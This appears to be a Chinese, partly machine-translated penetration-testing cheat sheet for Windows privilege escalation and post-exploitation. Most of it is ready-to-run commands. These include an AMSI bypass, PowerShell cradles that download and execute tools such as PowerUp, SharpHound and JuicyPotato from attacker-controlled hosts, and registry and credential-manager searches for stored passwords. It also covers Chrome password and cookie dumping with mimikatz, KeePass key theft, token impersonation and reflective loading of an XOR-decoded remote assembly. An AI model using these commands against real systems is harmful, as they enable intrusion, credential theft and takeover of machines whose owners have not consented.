<h2 id="SharePoint-工具参考链接内容"><a href="#SharePoint-工具参考链接内容" class="headerlink" title="SharePoint 工具参考链接内容"></a>SharePoint 工具参考链接内容</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">https://www.crummie5.club/the<span class="hljs-literal">-lone-sharepoint</span>/<br></code></pre></td></tr></table></figure>
<h2 id="IIS-服务参考内容链接"><a href="#IIS-服务参考内容链接" class="headerlink" title="IIS 服务参考内容链接"></a>IIS 服务参考内容链接</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br>https://drive.google.com/file/d/<span class="hljs-number">1</span>O0IARjqP4Pwa<span class="hljs-literal">-ae1nAP8Nr9qb0ai2XPu</span>/view<br><br>一切你需要的黑客IIS，最近的谈话从Shubs<br><br></code></pre></td></tr></table></figure>
<p>简易ASMI旁路（AMSI失败）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br><span class="hljs-number">1</span>. 打开powershell，获取一个独特的AMSI旁路 from: https://amsi.fail/<br><br><span class="hljs-number">2</span>. 从以下位置获取您喜爱的C<span class="hljs-comment">#程序集：https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/这些只是标准的C#可执行文件，但在powershell包装器中进行反射。</span><br><br><span class="hljs-number">3</span>. 在本地托管这些并通过执行 <span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> net.webclient).downloadstring(<span class="hljs-string">&quot;http://x.x.x.x./Invoke-Seatbelt.ps1&quot;</span>)<br><br></code></pre></td></tr></table></figure>
<h1 id="四、Windows-权限提升命令集合"><a href="#四、Windows-权限提升命令集合" class="headerlink" title="四、Windows 权限提升命令集合"></a>四、Windows 权限提升命令集合</h1><h2 id="Basics提权信息搜集"><a href="#Basics提权信息搜集" class="headerlink" title="Basics提权信息搜集"></a>Basics提权信息搜集</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell">systeminfo<br>wmic qfe<br>net users<br>hostname<br>whoami<br>net localgroups<br><span class="hljs-built_in">echo</span> %logonserver%<br>netsh firewall show state<br>netsh firewall show config<br>netstat <span class="hljs-literal">-an</span><br><span class="hljs-built_in">type</span> C:\Windows\system32\drivers\etc\hosts<br></code></pre></td></tr></table></figure>
<h2 id="PowerUp-ps1-工具提权"><a href="#PowerUp-ps1-工具提权" class="headerlink" title="PowerUp.ps1 工具提权"></a>PowerUp.ps1 工具提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe /c <span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).downloadString(<span class="hljs-string">&#x27;webserver/PowerUp.ps1&#x27;</span>) ;<span class="hljs-built_in">Invoke-AllChecks</span><br></code></pre></td></tr></table></figure>
<h2 id="SharpUp-工具提权"><a href="#SharpUp-工具提权" class="headerlink" title="SharpUp 工具提权"></a>SharpUp 工具提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/GhostPack/SharpUp</span><br><br>C可以反射加载的PowerUp.ps1的Sharp实现。<br></code></pre></td></tr></table></figure>
<h2 id="如果是AD环境，那就使用-Bloodhound进行枚举"><a href="#如果是AD环境，那就使用-Bloodhound进行枚举" class="headerlink" title="如果是AD环境，那就使用 Bloodhound进行枚举"></a>如果是AD环境，那就使用 Bloodhound进行枚举</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs powershell">SharpHound.ps1<br>SharpHound.exe -&gt; https://github.com/BloodHoundAD/SharpHound<br><br><span class="hljs-built_in">IEX</span>(System.Net.WebClient.DownloadString(<span class="hljs-string">&#x27;http://webserver:4444/SharpHound.ps1&#x27;</span>))<br><br><span class="hljs-built_in">Invoke-CollectionMethod</span> All<br><br>Import .zip to Bloodhound<br><br>如果你不能解开拉链。。。想办法；）我开玩笑，我开玩笑。输出为纯json并手动复制。这是一个很大的痛苦，但它是有效的。<br></code></pre></td></tr></table></figure>
<h2 id="Bloodhound-Python-工具枚举信息"><a href="#Bloodhound-Python-工具枚举信息" class="headerlink" title="Bloodhound-Python 工具枚举信息"></a>Bloodhound-Python 工具枚举信息</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">git clone https://github.com/fox<span class="hljs-literal">-it</span>/BloodHound.py.git<br><span class="hljs-built_in">cd</span> BloodHound.py/ &amp;&amp; pip install .<br><br>bloodhound<span class="hljs-literal">-python</span> <span class="hljs-literal">-d</span> m0chanAD.local <span class="hljs-literal">-u</span> m0chan <span class="hljs-literal">-p</span> Summer2019 <span class="hljs-literal">-gc</span> DOMAINCONTROLLER.m0chanAD.local <span class="hljs-literal">-c</span> all<br></code></pre></td></tr></table></figure>
<h2 id="注册表明文密码查看"><a href="#注册表明文密码查看" class="headerlink" title="注册表明文密码查看"></a>注册表明文密码查看</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Windows autologin</span><br>reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span><br><br><span class="hljs-comment"># VNC</span><br>reg query <span class="hljs-string">&quot;HKCU\Software\ORL\WinVNC3\Password&quot;</span><br><br><span class="hljs-comment"># SNMP Parameters</span><br>reg query <span class="hljs-string">&quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</span><br><br><span class="hljs-comment"># Putty</span><br>reg query <span class="hljs-string">&quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</span><br><br><span class="hljs-comment"># Search for password in registry</span><br>reg query HKLM /f password /t REG_SZ /s<br>reg query HKCU /f password /t REG_SZ /s<br></code></pre></td></tr></table></figure>
<h2 id="查看已安装的软件"><a href="#查看已安装的软件" class="headerlink" title="查看已安装的软件"></a>查看已安装的软件</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell">tasklist /SVC<br>net <span class="hljs-built_in">start</span><br>reg query HKEY_LOCAL_MACHINE\SOFTWARE<br>DRIVERQUERY<br><br><span class="hljs-built_in">dir</span> /a <span class="hljs-string">&quot;C:\Program Files&quot;</span><br><span class="hljs-built_in">dir</span> /a <span class="hljs-string">&quot;C:\Program Files (x86)&quot;</span><br>reg query HKEY_LOCAL_MACHINE\SOFTWARE<br><br><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-string">&#x27;C:\Program Files&#x27;</span>, <span class="hljs-string">&#x27;C:\Program Files (x86)&#x27;</span> | <span class="hljs-built_in">ft</span> Parent,Name,LastWriteTime<br><br><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-path</span> Registry::HKEY_LOCAL_MACHINE\SOFTWARE | <span class="hljs-built_in">ft</span> Name<br></code></pre></td></tr></table></figure>
<h2 id="弱文件夹权限提权"><a href="#弱文件夹权限提权" class="headerlink" title="弱文件夹权限提权"></a>弱文件夹权限提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell">程序文件夹上“所有人”的完全权限<br><br>icacls <span class="hljs-string">&quot;C:\Program Files\*&quot;</span> <span class="hljs-number">2</span>&gt;nul | findstr <span class="hljs-string">&quot;(F)&quot;</span> | findstr <span class="hljs-string">&quot;Everyone&quot;</span><br>icacls <span class="hljs-string">&quot;C:\Program Files (x86)\*&quot;</span> <span class="hljs-number">2</span>&gt;nul | findstr <span class="hljs-string">&quot;(F)&quot;</span> | findstr <span class="hljs-string">&quot;Everyone&quot;</span><br><br>icacls <span class="hljs-string">&quot;C:\Program Files\*&quot;</span> <span class="hljs-number">2</span>&gt;nul | findstr <span class="hljs-string">&quot;(F)&quot;</span> | findstr <span class="hljs-string">&quot;BUILTIN\Users&quot;</span><br>icacls <span class="hljs-string">&quot;C:\Program Files (x86)\*&quot;</span> <span class="hljs-number">2</span>&gt;nul | findstr <span class="hljs-string">&quot;(F)&quot;</span> | findstr <span class="hljs-string">&quot;BUILTIN\Users&quot;</span> <br><br>修改程序文件夹中每个人的权限<br><br>icacls <span class="hljs-string">&quot;C:\Program Files\*&quot;</span> <span class="hljs-number">2</span>&gt;nul | findstr <span class="hljs-string">&quot;(M)&quot;</span> | findstr <span class="hljs-string">&quot;Everyone&quot;</span><br>icacls <span class="hljs-string">&quot;C:\Program Files (x86)\*&quot;</span> <span class="hljs-number">2</span>&gt;nul | findstr <span class="hljs-string">&quot;(M)&quot;</span> | findstr <span class="hljs-string">&quot;Everyone&quot;</span><br><br>icacls <span class="hljs-string">&quot;C:\Program Files\*&quot;</span> <span class="hljs-number">2</span>&gt;nul | findstr <span class="hljs-string">&quot;(M)&quot;</span> | findstr <span class="hljs-string">&quot;BUILTIN\Users&quot;</span> <br>icacls <span class="hljs-string">&quot;C:\Program Files (x86)\*&quot;</span> <span class="hljs-number">2</span>&gt;nul | findstr <span class="hljs-string">&quot;(M)&quot;</span> | findstr <span class="hljs-string">&quot;BUILTIN\Users&quot;</span> <br></code></pre></td></tr></table></figure>
<h2 id="计划的任务查询"><a href="#计划的任务查询" class="headerlink" title="计划的任务查询"></a>计划的任务查询</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">schtasks /query /fo LIST /v<br></code></pre></td></tr></table></figure>
<h2 id="Powershell-历史命令查询"><a href="#Powershell-历史命令查询" class="headerlink" title="Powershell 历史命令查询"></a>Powershell 历史命令查询</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">type</span> C:\Users\m0chan\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt<br><span class="hljs-built_in">cat</span> (<span class="hljs-built_in">Get-PSReadlineOption</span>).HistorySavePath<br><span class="hljs-built_in">cat</span> (<span class="hljs-built_in">Get-PSReadlineOption</span>).HistorySavePath | <span class="hljs-built_in">sls</span> passw<br></code></pre></td></tr></table></figure>
<h2 id="查看连接的驱动器"><a href="#查看连接的驱动器" class="headerlink" title="查看连接的驱动器"></a>查看连接的驱动器</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net use<br>wmic logicaldisk get caption,description<br><br><span class="hljs-built_in">Get-PSDrive</span> | <span class="hljs-built_in">where</span> &#123;<span class="hljs-variable">$_</span>.Provider <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;Microsoft.PowerShell.Core\FileSystem&quot;</span>&#125;| <span class="hljs-built_in">ft</span> Name,Root<br></code></pre></td></tr></table></figure>
<h2 id="查看当前用户权限信息"><a href="#查看当前用户权限信息" class="headerlink" title="查看当前用户权限信息"></a>查看当前用户权限信息</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">whoami /priv<br><br>查找SeImpersonate、SeDebugPrivilege等<br></code></pre></td></tr></table></figure>
<h2 id="是否有其他人登录？"><a href="#是否有其他人登录？" class="headerlink" title="是否有其他人登录？"></a>是否有其他人登录？</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">qwinsta<br></code></pre></td></tr></table></figure>
<h2 id="查看注册表自动登录"><a href="#查看注册表自动登录" class="headerlink" title="查看注册表自动登录"></a>查看注册表自动登录</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query <span class="hljs-string">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;</span> <span class="hljs-number">2</span>&gt;nul | findstr <span class="hljs-string">&quot;DefaultUserName DefaultDomainName DefaultPassword&quot;</span><br><br><span class="hljs-built_in">Get-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&#x27;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#x27;</span> | <span class="hljs-built_in">select</span> <span class="hljs-string">&quot;Default*&quot;</span><br></code></pre></td></tr></table></figure>
<h2 id="在凭据管理器中查看存储的凭据"><a href="#在凭据管理器中查看存储的凭据" class="headerlink" title="在凭据管理器中查看存储的凭据"></a>在凭据管理器中查看存储的凭据</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell">cmdkey /list<br><span class="hljs-built_in">dir</span> C:\Users\username\AppData\Local\Microsoft\Credentials\<br><span class="hljs-built_in">dir</span> C:\Users\username\AppData\Roaming\Microsoft\Credentials\<br><br><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Hidden</span> C:\Users\username\AppData\Local\Microsoft\Credentials\<br><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Hidden</span> C:\Users\username\AppData\Roaming\Microsoft\Credentials\<br></code></pre></td></tr></table></figure>
<h2 id="查看未加括号的服务路径"><a href="#查看未加括号的服务路径" class="headerlink" title="查看未加括号的服务路径"></a>查看未加括号的服务路径</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic service get name,displayname,pathname,startmode <span class="hljs-number">2</span>&gt;nul |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> <span class="hljs-number">2</span>&gt;nul |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> <span class="hljs-number">2</span>&gt;nul |findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where &#123;<span class="hljs-variable">$_</span>.StartMode -eq &quot;</span>Auto<span class="hljs-string">&quot; -and <span class="hljs-variable">$_</span>.PathName -notlike &quot;</span>C:\Windows*<span class="hljs-string">&quot; -and <span class="hljs-variable">$_</span>.PathName -notlike &#x27;&quot;</span>*<span class="hljs-string">&#x27;&#125; | select PathName,DisplayName,Name</span><br></code></pre></td></tr></table></figure>
<h2 id="查看启动项目"><a href="#查看启动项目" class="headerlink" title="查看启动项目"></a>查看启动项目</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">wmic startup get caption,command<br>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run<br>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce<br>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run<br>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce<br><span class="hljs-built_in">dir</span> <span class="hljs-string">&quot;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&quot;</span><br><span class="hljs-built_in">dir</span> <span class="hljs-string">&quot;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&quot;</span><br></code></pre></td></tr></table></figure>
<h2 id="检查AlwaysInstalledElevated-Reg-Key"><a href="#检查AlwaysInstalledElevated-Reg-Key" class="headerlink" title="检查AlwaysInstalledElevated Reg Key"></a>检查AlwaysInstalledElevated Reg Key</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br><span class="hljs-built_in">Get-ItemProperty</span> HKLM\Software\Policies\Microsoft\Windows\Installer<br><span class="hljs-built_in">Get-ItemProperty</span> HKCU\Software\Policies\Microsoft\Windows\Installer<br>reg query HKLM\Software\Policies\Microsoft\Windows\Installer<br>reg query HKCU\Software\Policies\Microsoft\Windows\Installer<br></code></pre></td></tr></table></figure>
<p>注册表中有密码吗？</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">reg query HKCU /f password /t REG_SZ /s<br>reg query HKLM /f password /t REG_SZ /s <br></code></pre></td></tr></table></figure>
<p>遗留的任何Sysrep或无人参与文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt <span class="hljs-number">2</span>&gt;nul<br><br><span class="hljs-built_in">Get-Childitem</span> –Path C:\ <span class="hljs-literal">-Include</span> *unattend*,*sysprep* <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-ErrorAction</span> SilentlyContinue | <span class="hljs-built_in">where</span> &#123;(<span class="hljs-variable">$_</span>.Name <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*.xml&quot;</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$_</span>.Name <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*.txt&quot;</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$_</span>.Name <span class="hljs-operator">-like</span> <span class="hljs-string">&quot;*.ini&quot;</span>)&#125;<br></code></pre></td></tr></table></figure>
<h2 id="GPP（组策略首选项）密码"><a href="#GPP（组策略首选项）密码" class="headerlink" title="GPP（组策略首选项）密码"></a>GPP（组策略首选项）密码</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">smbclient //DOMAINCONTROLLER.local/SYSVOL <span class="hljs-literal">-U</span> m0chan<br><br>\m0chanAD.local\Policies\&#123;<span class="hljs-number">31</span>B2F340<span class="hljs-literal">-016D-11D2-945F-00C04FB984F9</span>&#125;\USER\Preferences\Groups\<br><br>http://www.sec<span class="hljs-literal">-1</span>.com/blog/wp<span class="hljs-literal">-content</span>/uploads/<span class="hljs-number">2015</span>/<span class="hljs-number">05</span>/gp3finder_v4.<span class="hljs-number">0</span>.zip - <span class="hljs-keyword">For</span> Decryption<br><br>Can also use PowerUP.ps1<br></code></pre></td></tr></table></figure>
<h2 id="转储Chrome密码（也称为漏洞利用后）"><a href="#转储Chrome密码（也称为漏洞利用后）" class="headerlink" title="转储Chrome密码（也称为漏洞利用后）"></a>转储Chrome密码（也称为漏洞利用后）</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># git clone https://github.com/rasta-mouse/CookieMonster</span><br><br>CookieMonster creds<br>CookieMonster.exe cookies <span class="hljs-literal">-d</span> [<span class="hljs-type">domain</span>] <span class="hljs-literal">-e</span> <br>CookieMonster <span class="hljs-literal">-a</span> <br><br>必须在目标用户的上下文中运行，因为chrome密码是用DPAPI加密的。<br><br>Can also use Mimikatz <span class="hljs-keyword">for</span> this.<br><br>mimikatz dpapi::chrome /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span><br><br>mimikatz dpapi::chrome /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Login Data&quot;</span> /unprotect<br><br>mimikatz dpapi::chrome /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;C:\Users\m0chan\AppData\Local\Google\Chrome\UserData\Default\Cookies&quot;</span> /unprotect<br></code></pre></td></tr></table></figure>
<h2 id="转储-KeePass"><a href="#转储-KeePass" class="headerlink" title="转储 KeePass"></a>转储 KeePass</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/HarmJ0y/KeeThief</span><br><span class="hljs-comment"># http://www.harmj0y.net/blog/redteaming/keethief-a-case-study-in-attacking-keepass-part-2/</span><br><br><span class="hljs-built_in">Get-Process</span> keepass<br>tasklist | findstr keepass<br><br>Attacking KeePass<br><br><span class="hljs-comment"># https://raw.githubusercontent.com/HarmJ0y/KeeThief/master/PowerShell/KeeThief.ps1</span><br><span class="hljs-built_in">Import-Module</span> KeeThief.ps1<br><span class="hljs-built_in">Get-KeePassDatabaseKey</span> <span class="hljs-literal">-Verbose</span><br><br>KeeTheft.exe, Microsoft.Diagnostics.Runtime.dll &amp; KeePatched.exe can also be used.<br></code></pre></td></tr></table></figure>
<h2 id="Token-令牌模拟攻击"><a href="#Token-令牌模拟攻击" class="headerlink" title="Token 令牌模拟攻击"></a>Token 令牌模拟攻击</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># https://github.com/PowerShellMafia/PowerSploit/blob/c7985c9bc31e92bb6243c177d7d1d7e68b6f1816/Exfiltration/Invoke-TokenManipulation.ps1</span><br><br><span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-ImpersonateUser</span> <span class="hljs-literal">-Username</span> <span class="hljs-string">&quot;lab\domainadminuser&quot;</span><br><span class="hljs-built_in">Get-Process</span> wininit | <span class="hljs-built_in">Invoke-TokenManipulation</span> <span class="hljs-literal">-CreateProcess</span> <span class="hljs-string">&quot;cmd.exe&quot;</span><br><br>还可以使用meterpreter的隐姓埋名窃取访问/委派令牌并模拟用户。（需要管理员/SYSTEM Privs）<br><br><span class="hljs-comment"># Tokenvator https://github.com/0xbadjuju/Tokenvator</span><br><br>反射式加载Powershell、Cobalt、SilentTrinity等。。。<br><br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$wc</span>=<span class="hljs-built_in">New-Object</span> System.Net.WebClient;<span class="hljs-variable">$wc</span>.Headers.Add(<span class="hljs-string">&quot;User-Agent&quot;</span>,<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0&quot;</span>);<span class="hljs-variable">$wc</span>.Proxy=[<span class="hljs-type">System.Net.WebRequest</span>]::DefaultWebProxy;<span class="hljs-variable">$wc</span>.Proxy.Credentials=[<span class="hljs-type">System.Net.CredentialCache</span>]::DefaultNetworkCredentials<br><span class="hljs-variable">$k</span>=<span class="hljs-string">&quot;xxxxxxx&quot;</span>;<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$b</span>=([<span class="hljs-built_in">byte</span>[]](<span class="hljs-variable">$wc</span>.DownloadData(<span class="hljs-string">&quot;https://xxxxx&quot;</span>)))|%&#123;<span class="hljs-variable">$_</span><span class="hljs-operator">-bxor</span><span class="hljs-variable">$k</span>[<span class="hljs-variable">$i</span>++%<span class="hljs-variable">$k</span><span class="hljs-type">.length</span>]&#125;<br>[<span class="hljs-type">System.Reflection.Assembly</span>]::Load(<span class="hljs-variable">$b</span>) | <span class="hljs-built_in">Out-Null</span><br><span class="hljs-variable">$parameters</span>=<span class="hljs-selector-tag">@</span>(<span class="hljs-string">&quot;arg1&quot;</span>, <span class="hljs-string">&quot;arg2&quot;</span>)<br>[<span class="hljs-type">namespace.Class</span>]::Main(<span class="hljs-variable">$parameters</span>)<br><br><br>反射负载。NET程序集，如果你不能通过你的C2基础设施做到这一点<br></code></pre></td></tr></table></figure>
<h2 id="烂土豆漏洞提权"><a href="#烂土豆漏洞提权" class="headerlink" title="烂土豆漏洞提权"></a>烂土豆漏洞提权</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Requires SeImpersonatePrivilege (Typically found on service accounts IIS Service, SQL Service etc)</span><br><br><span class="hljs-comment"># Reference https://ohpe.it/juicy-potato/</span><br><br>要求：SeAssignPrimaryTokenPrivilege和/或SeImpersonatePrivilege<br><br>(<span class="hljs-built_in">new-object</span> System.Net.WebClient).DownloadFile(<span class="hljs-string">&#x27;http://10.10.14.5:8000/JuicyPotato.exe&#x27;</span>,<span class="hljs-string">&#x27;C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRESS\MSSQL\Backup\JuicyPotato.exe&#x27;</span>)<br><br>JuicyPotato.exe <span class="hljs-literal">-l</span> <span class="hljs-number">1337</span> <span class="hljs-literal">-p</span> C:\Users\Public\Documents\Mochan.exe <span class="hljs-literal">-t</span> * <span class="hljs-literal">-c</span> &#123;<span class="hljs-number">5</span>B3E6773<span class="hljs-literal">-3A99-4A3D-8096-7765DD11785C</span>&#125;<br><br>Mochan.exe = Payload<br><span class="hljs-number">5</span>B3E6773<span class="hljs-literal">-3A99-4A3D-8096-7765DD11785C</span> = Target CLISD<br><br>CLSID是标识COM类对象的GUID<br><br>也可以使用<span class="hljs-literal">-A</span>标志在cmd.exe/powershell.exe等旁边指定参数<br><br>多汁的土豆必须从CMD SHELL而不是POWERSHELL运行<br><br></code></pre></td></tr></table></figure>
